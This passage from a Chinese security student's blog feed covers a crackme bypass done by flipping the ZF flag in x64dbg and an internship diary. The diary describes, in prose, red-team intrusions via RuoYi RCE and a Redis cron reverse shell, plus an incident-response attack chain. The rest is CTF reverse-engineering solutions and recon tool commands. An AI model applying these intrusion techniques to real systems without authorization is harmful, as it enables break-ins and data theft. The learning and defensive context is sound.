src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-35-25.png"></p><p>接下来，使用IDA查看文件结构，这个时候假装我们不知道代码是自己写的😁</p><p>可以看到如下的文件结构：</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-37-10.png"></p><p><strong>这里普及一下：红色的线表示if语句为真，绿色的线表示if语句结果为假</strong></p><p>然后可以发现，我们需要得到<code>Congratulation!</code>，那么用鼠标选中这条线，按空格切换到汇编代码：</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-41-37.png"></p><p>使用了一个<code>jz</code>指令，这里我们需要知道这条指令由状态标志寄存器的ZF位决定，为1则跳转</p><p>ZF表示结果运算是否为0，如果为0则置1，反之置0。</p><p>所以这里我只需要让ZF&#x3D;1即可</p><p>将程序拖进x64dbg里，然后程序会自动运行，这里读者不知道为什么会自动中断😂，这里直接继续运行</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-46-55.png"></p><p>到需要我们输入密码即可，这里我们需要寻找之前分析出来的判断位置，然后下断点，修改标志位即可破解成功！</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-49-19.png"></p><p>我们可以通过调用堆栈窗口，查看crack_me.exe的调用，然后查找出来位置，然后在即将跳转的那个指令处打下断点，可以发现这里<code>x64gbd</code>汇编出来是<code>je</code>指令，笔者这里还不清楚为什么会这样😭。当然这里效果和jz是一样，破解方法不变。</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-51-51.png"></p><p>然后在terminal里输入密码，就会在断点处停下，在视图右侧会显示当前CPU的一些寄存器的状态，修改ZF&#x3D;1再单步调试到输出即可。</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-55-57.png"></p><p>破解成功！原密码为1234567</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-59-46.png"></p><p>第一章学习完毕！</p><p>之前有些基础，所以觉得不难，但是还是觉得这本书太适合入门了，写的很清晰明了的😍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大二暑期某乙方厂实习纪实</title>
    <link href="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/"/>
    <url>/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="暑期实习复盘"><a href="#暑期实习复盘" class="headerlink" title="暑期实习复盘"></a>暑期实习复盘</h1><p>开始上课了就没有更新博客了的😭，现在复盘一下暑假在某安全公司实习的经历吧</p><span id="more"></span><h2 id="Part1——bj市Hvv"><a href="#Part1——bj市Hvv" class="headerlink" title="Part1——bj市Hvv"></a>Part1——bj市Hvv</h2><p>话说来真的很幸运，恰巧学校和某盟有个合作，来学校给我们讲课，刚好碰上bj市Hvv，感觉是他们没人想去哈哈，就在学生里找人去，然后我这个小菜鸡之前接触过一点，就被拉去当黑奴了，拿着160一天去当攻击队，笑死。不过之前没参加过Hvv，就当长见识了了😋</p><h3 id="Hvv之坐牢"><a href="#Hvv之坐牢" class="headerlink" title="Hvv之坐牢"></a>Hvv之坐牢</h3><p>​一共是3个人来着，我和一个大三的学长，然后一个某盟的师傅，然后我俩没接触过，导致前两天连外网打点都不熟悉笑死，一天就只能收集一丁点站点信息。然后就是无尽的坐牢，最开始只会用<code>Layer</code>爆破个子域名，后续就不知道咋办了，钓鱼也不会的🐸，后面师傅给了一个<code>Kscan</code>，意外的还挺好用，但是还是坐牢。bj市的靶标太难打了，某医院的蓝队，我就扫描了一下网站后台目录，直接给我IP封了笑死。靶标里还有<code>ByteDance</code>笑死，感觉根本没人打，之后调整为公共靶标后还是没人打。发现了几处<code>shiro</code>，但是没用，感觉早就被打烂然后修了，白激动一阵。反正吧，打点手法太匮乏，前几天都没啥收获，坐牢！🤣</p><h3 id="Hvv之突破"><a href="#Hvv之突破" class="headerlink" title="Hvv之突破"></a>Hvv之突破</h3><p>​继坐牢3天后，发现些许弱口令，但是都没有太大的突破。突然在一处靶标的边缘站点发现了一处弱口令，找到了百万条缴费数据信息，拿到了一些数据分（这么多才给1200多分🤣），有了开门红之后，好像相继就出现了一些可打的资产。</p><p>​在一处站点发现了弱口令，并且是<code>若依CMS</code>，直接用<code>Nday</code>下定时任务打出<code>RCE</code>，但是后面出现了一个问题，这网站跑在<code>docker</code>里的笑死，也不能虚拟化逃逸，最终只能乖乖就范，内网没戏了，只有一丢丢分啦，真的栓Q了是😅，只有一丢丢分啦。</p><p>​之后通过师傅的社工，社工到了一个站点的密码，然后发现不是站点密码，扫描端口发现有<code>Redis</code>服务，诶，用这密码给连上了，嘿嘿，然后快乐定时任务，弹个<code>shell</code>上来，直接拿下，后面内网就是师傅在弄了，反正就是搭个<code>frp</code>，做内网穿透就是。然后上<code>fscan</code>狂扫嘿嘿。这个站拿下了不少分还是。</p><p><img src="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/Redis_GETSHELL.jpg"></p><p>​然后后面几天确实就没啥收获了，该打的资产都打了，自己还是太菜了，不过也没关系啦，反正就是去玩一玩。</p><h2 id="Part2——去公司当黑奴"><a href="#Part2——去公司当黑奴" class="headerlink" title="Part2——去公司当黑奴"></a>Part2——去公司当黑奴</h2><p>​本来不是很想去的，但是想着去体验一把，还是去了，结果是去当黑奴的😅，咋就这么缺人呢，我就是一个实习生，都给我派的啥活真是</p><h3 id="Lenovo三进三出——达成次次摸🐟成就"><a href="#Lenovo三进三出——达成次次摸🐟成就" class="headerlink" title="Lenovo三进三出——达成次次摸🐟成就"></a>Lenovo三进三出——达成次次摸🐟成就</h3><p>​实现第三天就被派出去出任务了，第一天是联想，上午赶到公司都10点了，去联想食堂吃了顿饭，食堂真大捏，鼠鼠羡慕捏。任务就是有个啥系统，每年都在测，年年都是那个问题，没意思，然后就是带我的师傅水一水报告然后就完事，结果带我那个师傅说他很快就要离职去大厂了笑死，感觉这公司不太好待呀，然后就是摸了一天的🐟，美美回学校。</p><p>​二入联想，又被叫去联想了，真的栓Q好嘛，这次任务又贼难，开发了个云平台，然后做测试，不是啊，我只是个实习生，叫我来干这活，无语死了，然后就是假装自己会，然后艰难地度过了一个下午，而且第一天传东西的时候把冰蝎给传过去了，然后被说了，我只是一个没参加过培训的实习生，我好想逃~~~😅。然后第二天又去了，依旧是坐牢一整天，甲方估计也看出来了我是个实习生，然后我就安安心心摸了一天的🐟。</p><p>​后面就没有去了，因为要开始国护了，嘿嘿，逃过一劫！</p><h3 id="单枪匹马闯gongan总部——悟出甲方是Daddy的真理"><a href="#单枪匹马闯gongan总部——悟出甲方是Daddy的真理" class="headerlink" title="单枪匹马闯gongan总部——悟出甲方是Daddy的真理"></a>单枪匹马闯gongan总部——悟出甲方是Daddy的真理</h3><p>​实习第二周，第一天被通知去北京gongan总部做渗透测试，一个人，啊哈？？？不是，真不把我当实习生啊，然后就苦逼地去了的😅结果一去，别人把我当大佬笑死，我真的栓Q，我这上头也是能吹，什么垃圾公司啊😅</p><p>​第一件事就是更换一下设备的证书，这个还好，一会就搞完了，话说第二个，叫我一下午测100多个系统，？？？，我真的是钱难挣💩难吃，而且只能拿他那里的破电脑做，光是我弄东西都花了我一个多小时，然后就是疯狂测试，压力是真的大，还在旁边盯着我，不敢吱声，无语死了，还好最后测出来了5、6个，不然我这真的绷不住。最后还把自己电脑充电线忘了，第二天早上还去拿。</p><p>​什么破公司！</p><h3 id="某公司应急响应——唯一有意思的项目"><a href="#某公司应急响应——唯一有意思的项目" class="headerlink" title="某公司应急响应——唯一有意思的项目"></a>某公司应急响应——唯一有意思的项目</h3><p>​唯一有意思的一次任务，和一个还在试用期的师傅，和搞技术的一起确实舒服很多，狗屁项目经理啥也不会，笑死😓。这次是某公司服务器被黑了然后被种了🐎子，找我们来找谁是小黑子（溯源）。大侦探办案，统统闪开！🤣</p><p>​经过一系列的分析以及提供给我们的已知信息，可以确定的是有人（估计是HR之类的公开信息比较多）的密码是弱口令或者通过社工字典给爆出来了，然后被小黑子摸上了外部VPN，然后小黑子开始畅游北京网络。</p><p>​首先是有一个禅道的OA系统，由于使用了和外部VPN相同的账密，直接被登入，后台存在越权漏洞，直接提权到管理账号，导致信息被泄露。至于泄露了多少信息，没有排查出来，但是可能泄露了许多账密。</p><p>​其次，通过摸排服务器的访问日志发现，小黑子扫到了一个测试服务器的SSH弱口令，诶哟，这小黑子运气真不错哦，凌晨3点连上的，这年轻人真能熬呀。由于这台测试服务器和南京那边的服务器是互通的，然后他通过这台测试服务器直接达到了南京那边的一个服务器上。</p><p>​具体手法分析出来，估计小黑子是先搭了一个隧道，访问到南京那边的服务器上存在的一个Jenkins应用，Jenkins用的是弱口令<code>a1234567</code>，被爆了，直接登陆进去，然后由于这个web应用自带执行脚本的功能，直接被小黑子种了🐎子。不要再用弱口令啦！😊😊</p><p>​然后小黑子通过南京那边的服务器以SSH私钥连接上了北京这边的文件共享服务器，我就很好奇这里，为啥在北京这边内网漫游的时候没发现，还得绕这么大一个圈子🤣，这小黑子真是。而且这SSH私钥是咋来的，不知道是不是那台服务器上泄露了还是怎么样，只有甲方自己清楚了。然后同样是中了相同的🐎子。</p><p>​下面就是整个攻击链路：</p><p><img src="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/%E6%8C%87%E6%8E%8C%E6%98%93%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.jpg"></p><p>​</p><h2 id="Part3——实习感概"><a href="#Part3——实习感概" class="headerlink" title="Part3——实习感概"></a>Part3——实习感概</h2><p><strong>想上学，想读书，不想当黑奴！！！</strong></p><p><strong>提升学历，做回自己！！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>实习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>与Re的初次邂逅</title>
    <link href="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/"/>
    <url>/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/</url>
    
    <content type="html"><![CDATA[<h2 id="与Re的初次邂逅😱"><a href="#与Re的初次邂逅😱" class="headerlink" title="与Re的初次邂逅😱"></a>与Re的初次邂逅😱</h2><span id="more"></span><h3 id="记录一些IDA的操作"><a href="#记录一些IDA的操作" class="headerlink" title="记录一些IDA的操作"></a>记录一些IDA的操作</h3><p>因为第一次做逆向题，所以IDA也不怎么会用😭，所以浅浅记录下</p><ul><li>IDA有两个版本：一个是打开32位程序的，一个是打开64位程序的，一定要用对，否则不能查看反汇编的代码</li><li>快捷键：<code>shift+F12</code>打开字符串预览，<code>F5</code>打开反汇编代码，<code>n</code>重命名函数或者变量，<code>/</code>是对该行添加注释</li></ul><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/1.jpg"></p><h3 id="ctfshow-re2"><a href="#ctfshow-re2" class="headerlink" title="ctfshow-re2"></a>ctfshow-re2</h3><p>是个32位的程序，用IDA打开，首先打开<code>strings</code>快速检索信息：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-28-39.png"></p><p>检索到一个敏感字符串，以及两个文件名，一个<code>enflag.txt</code>已经提供</p><p>连续定位到读取文件的位置，找到主函数：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-33-49.png"></p><p>查看其反汇编代码：</p><p>这里出现了一点小问题，在查看返回编代码时出现栈顶指针地址为负的情况，导致反汇编失败，通俗来说就是IDA不能识别主函数的大括号具体在哪</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-45-50.png"></p><p>解决办法：打开<code>Options/general</code>，勾选<code>Stack pointer</code>，用于显示栈顶指针的位置</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-47-21.png"></p><p>这个时候可以看到地址了，然后修改最后一个地址为正数的地址</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-50-29.png"></p><p>我这里修改为<code>-0x440</code>，将最后一个位置<code>retn</code>那里设为栈顶指针</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-52-25.png"></p><p>然后我们就可以看出反汇编的代码了：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-53-56.png"></p><p>分析程序：先把一些明显的函数和变量改成易读的名字</p><p>分析的过程中发现了这样一个函数：</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-03-25.png"></p><p>点击进去后：发现了我们熟悉的字符串，说明这个函数是校验逻辑，将输入的<code>Key(Str)</code>做了一个异或赋值给了内置的字符串<code>Str1</code>，然后判断<code>Str1</code>的值是否等于<code>DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;</code>，由此我们可以爆破出<code>Key</code>的值</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-04-42.png"></p><p>写脚本出<code>Key</code>值：<code>[Warnning]Access_Unauthorized</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;&quot;</span><br>Key = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">29</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">130</span>):<br>        <span class="hljs-keyword">if</span> j^<span class="hljs-number">0x1F</span>==<span class="hljs-built_in">ord</span>(s[i]):<br>            Key+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(Key)<br></code></pre></td></tr></table></figure><p>之后下面那个函数点进去发现就是加密函数，看不懂😭😭😭，再看看其他的</p><p>这时候发现，为什么读入的是<code>flag.txt</code>，而给我的是<code>enflag.txt</code>，这应该是答案输出的文本，那么合理推测，<code>enflag.txt</code>里应该就是被加密的文本，所以我们改一下名称，然后运行程序，输入<code>Key</code>，然后输出答案？🐸</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-28-12.png"></p><p>答案是的！蒙对了🐸，<code>flag</code>输出在了程序新建的<code>enflag.txt</code>里：<code>flag&#123;RC4&amp;-&gt;ENc0d3F1le&#125;</code></p><h3 id="ctfshow-re3"><a href="#ctfshow-re3" class="headerlink" title="ctfshow-re3"></a>ctfshow-re3</h3><p>是个64位的程序，用IDA打开，然后反汇编，得到如下结果</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_10-38-18.png"></p><p>首先拿到题目，一步一步来看，到<code>strncpy</code>这个位置，发现是将<code>v19</code>的前<code>n</code>个字符复制到<code>dest</code>里 ，然后发现<code>v19</code>根本没有被赋值😂，那<code>copy</code>了个啥呢</p><p>我们发现，<code>s[5]</code>和<code>v19</code>是连续定义的</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-10-36.png"></p><p>查看变量的栈：直接点击变量进去，发现两个变量在<code>main</code>的栈中确实是连续的，那么猜测存在溢出</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-18-09.png"></p><p>点击<code>read_input</code>进去，</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-17-01.png"></p><p>发现确实使用了<code>scan</code>而且没有指定读入长度，那么确实存在溢出，输入的内容前五个字符存在<code>s</code>，其他的都溢出到了<code>v19</code>变量中</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-18-32.png"></p><p>这下解决了<code>v19</code>的问题，</p><p>然后再往下看，读入内容进入变量<code>v5</code>，最后赋值给了<code>array[6]</code>，然后进入循环，将<code>array</code>中的内容一次加到变量<code>a</code>中，最后会加上我们的输入，所以答案就是用<code>0xFFFF</code>减去<code>a</code>最后的值，因为这里我们设置<code>v5</code>的值为0</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-27-07.png"></p><p>所以答案就是<code>hex(65525-58720)</code>，为<code>1A9F</code>，这里填答案，出题者设置的是小写字母</p><p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-31-48.png"></p><p>贴上通关逻辑：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> array[<span class="hljs-number">8</span>]=&#123;<span class="hljs-number">80</span>,<span class="hljs-number">64227</span>,<span class="hljs-number">226312059</span>,<span class="hljs-number">-1540056586</span>,<span class="hljs-number">20496</span>,<span class="hljs-number">3833</span>,<span class="hljs-number">6815</span>&#125;;<br>    <span class="hljs-type">unsigned</span> __int64 a=<span class="hljs-number">0LL</span>;<br>    <span class="hljs-type">int</span> v15=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> v14;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>    &#123;<br>        <span class="hljs-keyword">for</span> ( a += (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)array[i]; a &gt; <span class="hljs-number">0xFFFF</span>; a = v15 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int16)a )<span class="hljs-comment">// a&gt;65535</span><br>        &#123;<br>            v14 = (<span class="hljs-type">unsigned</span> __int16)a;<br>            v15 = a &gt;&gt; <span class="hljs-number">16</span>;<br>        &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a == <span class="hljs-number">0xFFFF</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集思路总结(持续完善)</title>
    <link href="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/"/>
    <url>/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/</url>
    
    <content type="html"><![CDATA[<p>总结一些用到的信息收集手法🐸🐸🐸</p><span id="more"></span><h2 id="如何快速寻得目标的大量资产"><a href="#如何快速寻得目标的大量资产" class="headerlink" title="如何快速寻得目标的大量资产"></a>如何快速寻得目标的大量资产</h2><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><h4 id="子域名挖掘机Layer"><a href="#子域名挖掘机Layer" class="headerlink" title="子域名挖掘机Layer"></a>子域名挖掘机Layer</h4><p>将主域名输入即可使用，字典很大，爆破效率也挺高的，支持导出为<code>txt</code>文件，蛮方便的</p><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-01-40.png"></p><h3 id="存活探测"><a href="#存活探测" class="headerlink" title="存活探测"></a>存活探测</h3><h4 id="Finger"><a href="#Finger" class="headerlink" title="Finger"></a>Finger</h4><p>蛮好用的一个对大量资产进行存活探测的脚本，最后会输出一个表格文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python Finger.py -f ./test.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-26-03.png"></p><h4 id="observer-ward"><a href="#observer-ward" class="headerlink" title="observer_ward"></a>observer_ward</h4><p>团队开发的工具，支持的参数比较多一点，闭源，扫描的要慢一点，但是细节更多，还会自动划分优先级，也蛮好用的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">.\observer_ward.exe -f ..\Finger-main\chehejia.com.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-36-39.png"></p><p><img src="/2023/09/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E5%AE%8C%E5%96%84/Snipaste_2023-09-09_20-36-50.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用Python编写一个xx库查询demo</title>
    <link href="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/"/>
    <url>/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/</url>
    
    <content type="html"><![CDATA[<p>用<code>Python</code>编写了一个自用的xx库查询小demo😘</p><span id="more"></span><h2 id="xx库查询小demo"><a href="#xx库查询小demo" class="headerlink" title="xx库查询小demo"></a>xx库查询小demo</h2><h3 id="初衷和设计"><a href="#初衷和设计" class="headerlink" title="初衷和设计"></a>初衷和设计</h3><h4 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h4><p>咱们就是说自己整理了一个<code>excel</code>文档，我想要像个专业人士去处理它🐸🐸</p><h4 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h4><p>采用<code>Python</code>去写，库最多，写起来最顺畅哈哈，唯一不方便的就是打成<code>exe</code>有点大哈哈</p><p>用到的库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd <span class="hljs-comment">#处理excel文档</span><br><span class="hljs-comment"># 图像界面</span><br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QApplication, QMainWindow, QLabel, QHBoxLayout, QVBoxLayout, QPushButton, QWidget, QLineEdit, QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox, QCheckBox, QFileDialog<br><span class="hljs-keyword">from</span> PyQt5.QtGui <span class="hljs-keyword">import</span> QIcon, QPixmap, QFont<br></code></pre></td></tr></table></figure><h3 id="编写过程中学到的知识"><a href="#编写过程中学到的知识" class="headerlink" title="编写过程中学到的知识"></a>编写过程中学到的知识</h3><h4 id="PyQT5使用"><a href="#PyQT5使用" class="headerlink" title="PyQT5使用"></a>PyQT5使用</h4><p>在使用定义一个图像界面时，最好是定义成一个类，然后在类里写处理函数，直接用<code>this</code>去处理，非常方便</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainWindow</span>(<span class="hljs-title class_ inherited__">QMainWindow</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_func</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>我们需要注意的是，凡是在类里面定义的函数，都需要一个固定参数<code>self</code>，否则会报错</strong></p><figure class="highlight 